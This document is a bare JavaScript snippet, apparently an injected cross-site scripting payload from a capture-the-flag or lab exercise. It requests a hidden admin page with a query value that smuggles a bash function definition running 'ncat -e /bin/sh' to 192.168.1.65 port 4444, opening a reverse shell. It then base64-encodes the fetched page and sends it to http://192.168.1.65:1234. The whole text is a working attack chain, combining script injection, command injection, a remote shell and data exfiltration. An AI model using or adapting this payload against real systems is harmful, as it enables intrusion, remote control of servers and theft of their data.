<script>
// Create a new XMLHttpRequest object
var xhr = new XMLHttpRequest();

// Define the URL of the web page to fetch
var url = '/admin_interface_JntjKPI5Awrqih_cant_guess/the_impossible_to_guess_webpage_dedicated_to_miley.php?envs[BASH_FUNC_echo()]=()%20{%20ncat%20-e%20/bin/sh%20192.168.1.65%204444;%20}';

// Set up the AJAX request
xhr.open('GET', url);

// Define the callback function to handle the response
xhr.onload = function() {
  // Check the HTTP status code
  if (xhr.status === 200) {
    // Get the response text (i.e., the HTML content)
    var html = xhr.responseText;
    
    // Encode the HTML content in base64
    var encodedHtml = btoa(html);
    
    // Define the URL of the remote server to send the data to
    var remoteUrl = 'http://192.168.1.65:1234?html=' + encodedHtml;
    
    // Create a new XMLHttpRequest object for the remote server request
    var remoteXhr = new XMLHttpRequest();
    
    // Set up the AJAX request to send the encoded HTML content to the remote server
    remoteXhr.open('GET', remoteUrl);
    remoteXhr.send();
    
    // Log a success message
    console.log('HTML content sent to ' + remoteUrl);
  } else {
    // Log an error message if the AJAX request failed
    console.log('Request failed. Status: ' + xhr.status);
  }
};

// Send the AJAX request to fetch the web page
xhr.send();
</script>